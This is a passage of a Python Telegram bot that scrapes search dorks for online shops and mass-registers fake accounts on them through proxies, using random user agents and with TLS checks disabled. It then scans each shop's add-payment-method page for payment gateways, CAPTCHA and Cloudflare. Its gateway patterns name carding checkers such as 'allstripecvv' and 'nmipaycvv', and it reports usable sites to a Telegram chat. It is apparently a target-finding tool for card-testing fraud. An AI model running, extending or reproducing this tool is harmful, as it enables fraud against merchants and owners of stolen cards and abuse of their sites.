        "Referer": register_url,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "email": generate_random_email(),
        "password": generate_random_string(12),
        "display_name": generate_random_username(),
    }
    try:
        resp = session.post(register_url, headers=headers, data=data, timeout=15, allow_redirects=True, verify=False)
        return resp.status_code in (200, 302)
    except Exception:
        return False

def try_register_method5(session, register_url):
    """Registration method 5: Email/password with account/register action"""
    headers = {
        "User-Agent": get_random_ua(),
        "Referer": register_url,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "email": generate_random_email(),
        "password": generate_random_string(12),
        "action": "register",
        "account": "register",
    }
    try:
        resp = session.post(register_url, headers=headers, data=data, timeout=15, allow_redirects=True, verify=False)
        return resp.status_code in (200, 302)
    except Exception:
        return False

def detect_payment_gateways_from_html(html_text):
    """Detect payment gateways from HTML content"""
    low = html_text.lower()
    gateways = []
    
    gateway_patterns = {
        "stripe": ["stripe", "pk_live_", "pk_test_", "stripe.com", "stripe.js", "stripe-elements", "stripeccn", "stripeconnectccn", "stripeconnectcvv", "allstripecvv"],
        "paypal": ["paypal", "paypal.com", "paypal_pro", "ppcp", "paypal-checkout", "paypal-button", "allpaypalpro", "ppcpcreditccccn", "ppcpcreditccccvv", "ppcpgatewayccn", "ppcpgatewaycvv", "angelleyepcpccccn", "angelleyepcpccccvv", "angelleyepcpccn", "angelleyepcpccvv"],
        "square": ["square", "squareup.com", "square payments", "squareup", "square-website-payments"],
        "braintree": ["braintree", "braintreegateway.com", "braintree_cc", "braintree_credit_card", "braintree.js", "braintreecc", "braintreecreditcard"],
        "adyen": ["adyen", "adyen.com", "adyen-payment"],
        "paystack": ["paystack", "paystack.com", "paystack-inline"],
        "razorpay": ["razorpay", "razorpay.com", "razorpay-checkout"],
        "2checkout": ["2checkout", "2co.com", "2checkout.com", "2co"],
        "authorize.net": ["authorize.net", "authorizenet", "authorizenet.com", "anet_", "authorizeaim", "authnocodecvv"],
        "worldpay": ["worldpay", "worldpay.com", "worldpay-payment"],
        "klarna": ["klarna", "klarna.com", "klarna-checkout"],
        "afterpay": ["afterpay", "afterpay.com", "afterpay-js"],
        "shopify": ["shopify", "shopify_payments", "shopify-pay"],
        "woocommerce": ["woocommerce", "wc-", "woocommerce-payment"],
        "mollie": ["mollie", "mollie.com", "mollie-payment"],
        "sagepay": ["sagepay", "sagepay.com", "sage-pay"],
        "opayo": ["opayo", "opayo.com"],
        "amazon pay": ["amazon pay", "amazonpayments", "amazon-pay", "amazonpay"],
        "apple pay": ["apple pay", "applepay", "apple-pay"],
        "google pay": ["google pay", "googlepay", "google-pay", "gpay"],
        "venmo": ["venmo", "venmo.com"],
        "zelle": ["zelle", "zelle.com"],
        "cash app": ["cash app", "cashapp", "square-cash"],
        "affirm": ["affirm", "affirm.com"],
        "sezzle": ["sezzle", "sezzle.com"],
        "quadpay": ["quadpay", "quadpay.com"],
        "zip": ["zip", "zip.co", "zip-payment"],
        "payoneer": ["payoneer", "payoneer.com"],
        "skrill": ["skrill", "skrill.com"],
        "neteller": ["neteller", "neteller.com"],
        "paysafecard": ["paysafecard", "paysafecard.com"],
        "ideal": ["ideal", "ideal.nl", "ideal-payment"],
        "sofort": ["sofort", "sofort.com", "sofortüberweisung"],
        "giropay": ["giropay", "giropay.de"],
        "eps": ["eps", "eps-payment"],
        "bancontact": ["bancontact", "bancontact.com"],
        "multibanco": ["multibanco", "multibanco.pt"],
        "przelewy24": ["przelewy24", "przelewy24.pl", "p24"],
        "payu": ["payu", "payu.com", "payu.pl", "payu.in", "payumoney.com"],
        "paytm": ["paytm", "paytm.com"],
        "phonepe": ["phonepe", "phonepe.com"],
        "payfast": ["payfast", "payfast.co.za"],
        "paygate": ["paygate", "paygate.co.za"],
        "yoco": ["yoco", "yoco.com"],
        "ozow": ["ozow", "ozow.com"],
        "snapscan": ["snapscan", "snapscan.io"],
        "zapper": ["zapper", "zapper.co.za"],
        "wechat pay": ["wechat pay", "wechatpay", "wechat-pay"],
        "alipay": ["alipay", "alipay.com"],
        "unionpay": ["unionpay", "unionpay.com", "china unionpay"],
        "mercadopago": ["mercadopago", "mercadopago.com", "mercadopago.com.br"],
        "pagseguro": ["pagseguro", "pagseguro.com.br"],
        "pagarme": ["pagarme", "pagarme.com.br"],
        "ebanx": ["ebanx", "ebanx.com"],
        "asapay": ["asapay", "asapay.com"],
        "payhere": ["payhere", "payhere.lk"],
        "ccavenue": ["ccavenue", "ccavenue.com"],
        "instamojo": ["instamojo", "instamojo.com"],
        "cashfree": ["cashfree", "cashfree.com"],
        "mobikwik": ["mobikwik", "mobikwik.com"],
        "freecharge": ["freecharge", "freecharge.com"],
        "pagofacil": ["pagofacil", "pagofacil.com.ar"],
        "rapipago": ["rapipago", "rapipago.com.ar"],
        "redpagos": ["redpagos", "redpagos.com.uy"],
        "safetypay": ["safetypay", "safetypay.com"],
        "webpay": ["webpay", "webpay.cl"],
        "khipu": ["khipu", "khipu.com"],
        "flow": ["flow", "flow.cl"],
        "transbank": ["transbank", "transbank.cl"],
        "openpay": ["openpay", "openpay.mx"],
        "conekta": ["conekta", "conekta.io"],
        "clip": ["clip", "clip.mx"],
        "iugu": ["iugu", "iugu.com.br"],
        "moip": ["moip", "moip.com.br"],
        "cielo": ["cielo", "cielo.com.br"],
        "rede": ["rede", "rede.com.br"],
        "getnet": ["getnet", "getnet.com.br"],
        "stone": ["stone", "stone.com.br"],
        "pagbank": ["pagbank", "pagbank.com.br"],
        "boleto": ["boleto", "boleto bancário"],
        "pix": ["pix", "pix-payment"],
        "payu latam": ["payu.com.ar", "payu.com.co", "payu.com.mx"],
        "payu brazil": ["payu.com.br"],
        "payu india": ["payu.in"],
        "payu money": ["payumoney.com"],
        "payu mexico": ["payu.com.mx"],
        "payu colombia": ["payu.com.co"],
        "payu argentina": ["payu.com.ar"],
        "payu chile": ["payu.cl"],
        "payu peru": ["payu.com.pe"],
        "payu ecuador": ["payu.com.ec"],
        "payu panama": ["payu.com.pa"],
        "payu costa rica": ["payu.co.cr"],
        "payu guatemala": ["payu.com.gt"],
        "payu honduras": ["payu.com.hn"],
        "payu nicaragua": ["payu.com.ni"],
        "payu el salvador": ["payu.com.sv"],
        "payu dominican republic": ["payu.com.do"],
        "payu jamaica": ["payu.com.jm"],
        "payu trinidad": ["payu.com.tt"],
        "payu barbados": ["payu.com.bb"],
        "payu bahamas": ["payu.com.bs"],
        "payu belize": ["payu.com.bz"],
        "payu guyana": ["payu.com.gy"],
        "payu suriname": ["payu.com.sr"],
        "payu venezuela": ["payu.com.ve"],
        "payu bolivia": ["payu.com.bo"],
        "payu paraguay": ["payu.com.py"],
        "payu uruguay": ["payu.com.uy"],
        # Additional gateways from custom identifiers
        "bluepay": ["bluepay", "acceptbluecard", "acceptbluecc"],
        "bambora": ["bambora", "beanstream", "bamboracreditcard"],
        "chase paymentech": ["chase paymentech", "chasetechapi", "chasetechapiccn"],
        "clover": ["clover", "cloverpayments"],
        "cybersource": ["cybersource", "cyberflex", "cyberflexccn"],
        "ebizcharge": ["ebizcharge"],
        "epx": ["epx", "electronic payment exchange"],
        "eway": ["eway", "ewaypayments"],
        "fat zebra": ["fatzebra"],
        "first data": ["first data", "firstdatapayeezygateway", "payeezy"],
        "global gateway": ["global gateway", "ggdirect"],
        "hms": ["hms", "host merchant services", "hmscvv"],
        "intuit": ["intuit", "intuitcc"],
        "moneris": ["moneris", "monerisccn", "monerisv1"],
        "nab": ["nab", "nabtransact"],
        "nmi": ["nmi", "network merchants", "nmipay", "nmiv1", "nmipaycvv", "woonnmipaypaymentgateway"],
        "payment sense": ["paymentsense"],
        "paytrace": ["paytrace", "paytrace1"],
        "sage": ["sage", "sagedirect", "sagepaymentsusaapi"],
        "securepay": ["securepay", "wcsecurepay", "wcsecurepaypro"],
        "useapay": ["useapay", "useapaycc"],
        "valorpay": ["valorpay"],
        "westpac": ["westpac", "westpacapi", "westpacnet"],
        "anz": ["anz", "anzegate"],
    }
    
    for gateway_name, patterns in gateway_patterns.items():
        if any(pattern in low for pattern in patterns):
            gateways.append(gateway_name.capitalize())
    
    # Remove duplicates while preserving order
    seen = set()
    unique_gateways = []
    for gw in gateways:
        if gw.lower() not in seen:
            seen.add(gw.lower())
            unique_gateways.append(gw)
    
    return unique_gateways if unique_gateways else ["Unknown"]

def check_site_payment_gateway(url, telegram_token, chat_id, proxy_port='', user_pass=''):
    """Third checker: Register account and detect payment gateways"""
    base_url = get_base_url_checker(url)
    if not base_url:
        return False
    
    try:
        parsed = urlparse(base_url)
        domain = parsed.hostname
        if not domain:
            return False
    except Exception:
        return False
    
    # Check if Stripe checker already found a good site - if so, skip this checker
    global stripe_good_sites, stripe_sites_lock
    with stripe_sites_lock:
        if base_url in stripe_good_sites:
            # Stripe checker already found a good site, skip Payment Gateway Detector
            return False
    
    # Small delay to give Stripe checker time to mark the site if it finds one
    # This helps avoid race conditions
    time.sleep(0.5)
    
    # Check again after delay
    with stripe_sites_lock:
        if base_url in stripe_good_sites:
            # Stripe checker found a good site during the delay, skip
            return False
    
    REGISTER_URL = f"{base_url}/my-account/"
    PAYMENT_URL = f"{base_url}/my-account/add-payment-method/"
    
    try:
        session = requests.Session()
        proxies = setup_checker_proxy(proxy_port, user_pass)
        if proxies:
            session.proxies = proxies
        
        # Try 5 different registration methods
        registration_methods = [
            try_register_method1,
            try_register_method2,
            try_register_method3,
            try_register_method4,
            try_register_method5,
        ]
        
        registered = False
        for method in registration_methods:
            if method(session, REGISTER_URL):
                registered = True
                break
        
        if not registered:
            return False
        
        # Get payment method page
        headers = {"User-Agent": get_random_ua()}
        try:
            page_html = session.get(PAYMENT_URL, headers=headers, timeout=15, verify=False).text
        except Exception:
            return False
        
        # Detect payment gateways from HTML
        gateways = detect_payment_gateways_from_html(page_html)
        gateway_str = ", ".join(gateways) if gateways else "Unknown"
        
        # Detect CAPTCHA and Cloudflare
        low = page_html.lower()
        has_captcha = any(k in low for k in ("recaptcha", "g-recaptcha", "h-captcha", "captcha"))
        has_cloudflare = any(k in low for k in ("cloudflare", "attention required", "checking your browser", "ray id"))
        
        captcha = "Found❌" if has_captcha else "Good✅"
        cloudflare = "Found❌" if has_cloudflare else "Good✅"
        
        # Format message
        telegram_message = (
            f"<b>Site:</b> <code>{html_escape(base_url)}</code>\n"
            f"<b>Gateway:</b> {gateway_str}\n"
            f"<b>Cloudflare:</b> {cloudflare}\n"
            f"<b>Captcha:</b> {captcha}"
        )
        
        # Send message with flood control
        send_telegram_message(chat_id, telegram_message, "HTML")
        return True
        
    except Exception:
        return False
# ============================================

def process_word(word, line_number, proxy_url, proxy_auth, output_file, error_file, counter_file):
    """Process a single word from wordlist - always returns line_number to ensure continuation"""
    try:
        if not word.strip():
            return line_number
        
        urls, error = get_links(word, proxy_url, proxy_auth)
        
        if error:
            save_err_link(word, error_file)
            print(f"{line_number} {word} ==> {RED}Error: {error}{RESET}")
            return line_number
        
        if urls:
            total_urls = len(urls)
            # Append URLs to JSON file
            try:
                append_urls_to_json(output_file, urls)
                print(f"{line_number} {word} ==> {GREEN}Total: {total_urls} sites{RESET}")
                save_line_number(line_number, counter_file)
            except Exception as e:
                print(f"{line_number} {word} ==> {RED}Error saving URLs: {e}{RESET}")
                save_err_link(word, error_file)
                return line_number
            
            # Check each site immediately after saving
            # Parse proxy for checker (proxy_url format: host:port, proxy_auth format: user:pass)
            # Check sites in background thread to not block processing
            # Try WooCommerce checker, Stripe checker, and Payment Gateway checker
            for idx, url in enumerate(urls):
                try:
                    # Try WooCommerce checker first
                    threading.Thread(
                        target=check_site_and_send,
                        args=(url, BOT_TOKEN, CHECKER_CHAT_ID, proxy_url, proxy_auth),
                        daemon=True
                    ).start()
                    
                    # Also try Stripe checker (second checker)
                    threading.Thread(
                        target=check_site_stripe,
                        args=(url, BOT_TOKEN, CHECKER_CHAT_ID, proxy_url, proxy_auth),
                        daemon=True
                    ).start()
                    
                    # Also try Payment Gateway checker (third checker)
                    threading.Thread(
                        target=check_site_payment_gateway,
                        args=(url, BOT_TOKEN, CHECKER_CHAT_ID, proxy_url, proxy_auth),
                        daemon=True
                    ).start()
                    
                    # Small delay between starting threads (0.4 seconds) to prevent overwhelming
                    if idx < len(urls) - 1:  # Don't delay after last URL
                        time.sleep(0.4)
                except Exception as e:
                    # Continue processing other URLs even if thread creation fails
                    print(f"{RED}Error starting checker thread: {e}{RESET}")
                    continue
        else:
            print(f"{line_number} {word} ==> {YELLOW}Total: 0 site{RESET}")
        
        return line_number
    except Exception as e:
        # Always return line_number even on unexpected errors to ensure processing continues
        print(f"{line_number} {word} ==> {RED}Unexpected error: {e}{RESET}")
        save_err_link(word, error_file)
        return line_number

def start_processing(chat_id=None):
    """Start the main processing function"""
    global dork
    
    # Setup directories
    os.makedirs("data", exist_ok=True)
    
    # File paths
    word_file = WORDLIST_FILE
    counter_file = "./data/counter.txt"
    backup_file = "./data/backup.txt"
    error_file = "./data/error.txt"
    dork_file = "./data/dork.txt"
    
    # Initialize JSON output file
    initialize_json_file(OUTPUT_FILE)
    
    # Load dork
    if os.path.exists(dork_file):
        with open(dork_file, 'r', encoding='utf-8') as f:
            dork = f.read().strip()
    else:
        if chat_id:
            send_telegram_message(chat_id, "❌ Dork file not found!")
        return
    
    # Setup proxy
    proxy_url, proxy_auth = setup_proxy()
    if not proxy_url or not proxy_auth:
        if chat_id:
            send_telegram_message(chat_id, "❌ Failed to setup proxy!")
        return
    
    # Read wordlist
    words = read_wordlist(word_file)
    if not words:
        if chat_id:
            send_telegram_message(chat_id, f"❌ Wordlist file '{word_file}' is empty or not found!")
        return
    
    # Get start line
    start_line = 1
    if os.path.exists(counter_file) and os.path.getsize(counter_file) > 0:
        try:
            with open(counter_file, 'r') as f:
                start_line = int(f.read().strip())
        except:
            start_line = 1
    
    words_to_process = words[start_line - 1:]
    total_words = len(words_to_process)
    
    if chat_id:
        send_telegram_message(chat_id, f"📊 Processing {total_words} words starting from line {start_line}")
    
    # Process in batches
    batch_size = 50
    counter = 0
    
    for i in range(0, len(words_to_process), batch_size):
        batch_words = words_to_process[i:i + batch_size]
        start_time = time.time()
        all_results = []
        
        try:
            with ThreadPoolExecutor(max_workers=batch_size) as executor:
                futures = []
                for idx, word in enumerate(batch_words):
                    line_num = start_line + i + idx
                    future = executor.submit(process_word, word, line_num, proxy_url, proxy_auth, OUTPUT_FILE, error_file, counter_file)
                    futures.append(future)
                
                # Process all futures with error handling to ensure continuation
                for future in futures:
                    try:
                        result = future.result(timeout=300)  # 5 minute timeout per word
                        if result:
                            all_results.append(result)
                    except Exception as e:
                        # Log error but continue processing
                        print(f"{RED}Error processing word: {e}{RESET}")
                        continue
        except Exception as e:
            # Log batch error but continue to next batch
            print(f"{RED}Error in batch processing: {e}{RESET}")
            if chat_id:
                try:
                    send_telegram_message(chat_id, f"⚠️ Error in batch, continuing... {str(e)[:100]}")
                except Exception:
                    pass
            # Still increment counter to ensure we don't get stuck
            counter += len(batch_words)
            continue
        
        # Save backup (with error handling)
        try:
            if all_results:
                largest_number = max(all_results)
                with open(backup_file, 'w') as f:
                    f.write(str(largest_number))
        except Exception as e:
            print(f"{RED}Error saving backup: {e}{RESET}")
        
        # Remove duplicates from JSON file (with error handling)
        try:
            remove_duplicate_json_urls(OUTPUT_FILE)
        except Exception as e:
            print(f"{RED}Error removing duplicates: {e}{RESET}")
        
        counter += len(batch_words)
        processing_time = time.time() - start_time
        
        # Progress update every 500 words
        if counter % 500 == 0 and chat_id:
            try:
                progress = (counter / total_words) * 100
                send_telegram_message(chat_id, f"📈 Progress: {counter}/{total_words} words ({progress:.1f}%)")
            except Exception as e:
                print(f"{RED}Error sending progress update: {e}{RESET}")
        
        # Check for proxy issues
        if len(all_results) == batch_size and processing_time < 4:
            if chat_id:
                try:
                    send_telegram_message(chat_id, "⚠️ Processing too fast, potential proxy issues detected")
                except Exception:
                    pass
            time.sleep(2)
    
    # Final cleanup (with error handling to ensure completion)
    try:
        remove_duplicate_lines(error_file)
    except Exception as e:
        print(f"{RED}Error removing duplicate lines: {e}{RESET}")
    
    # Check if there are errors to retry
    try:
        if os.path.exists(error_file) and os.path.getsize(error_file) > 0:
            error_count = len(open(error_file, 'r', encoding='utf-8', errors='ignore').readlines())
            if error_count > 3:
                if chat_id:
                    try:
                        send_telegram_message(chat_id, f"⚠️ {error_count} errors found. Consider retrying.")
                    except Exception:
                        pass
    except Exception as e:
        print(f"{RED}Error checking error file: {e}{RESET}")
    
    # Cleanup temp files (with error handling)
    try:
        if os.path.exists(counter_file):
            remove_file(counter_file)
        if os.path.exists(backup_file):
            remove_file(backup_file)
    except Exception as e:
        print(f"{RED}Error cleaning up temp files: {e}{RESET}")
    
    # Get final stats (always send completion message)
    total_urls = 0
    try:
        if os.path.exists(OUTPUT_FILE):
            with open(OUTPUT_FILE, 'r', encoding='utf-8') as f:
                total_urls = sum(1 for line in f if line.strip())
    except Exception as e:
        print(f"{RED}Error reading output file: {e}{RESET}")
    
    if chat_id:
        try:
            send_telegram_message(chat_id, f"✅ Complete! Processed all words. Found {total_urls} unique URLs in '{OUTPUT_FILE}'")
        except Exception as e:
            print(f"{RED}Error sending completion message: {e}{RESET}")

def main():
    """Main function to start the bot"""
    global BOT_TOKEN, ADMIN_ID
    
    # Check if bot token and admin ID are set
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or ADMIN_ID == "YOUR_ADMIN_ID_HERE":
        print(f"{RED}Error: Please set BOT_TOKEN and ADMIN_ID in the script!{RESET}")
        print(f"{CYAN}Edit the configuration section at the top of the file.{RESET}")
        return
    
    # Initialize bot
    print(f"{GREEN}Starting Telegram Bot...{RESET}")
    print(f"{CYAN}Bot Token: {BOT_TOKEN[:10]}...{RESET}")
    print(f"{CYAN}Admin ID: {ADMIN_ID}{RESET}")
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_dork))
    
    # Start bot
    print(f"{GREEN}Bot is running...{RESET}")
    print(f"{CYAN}Send /start to begin{RESET}")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
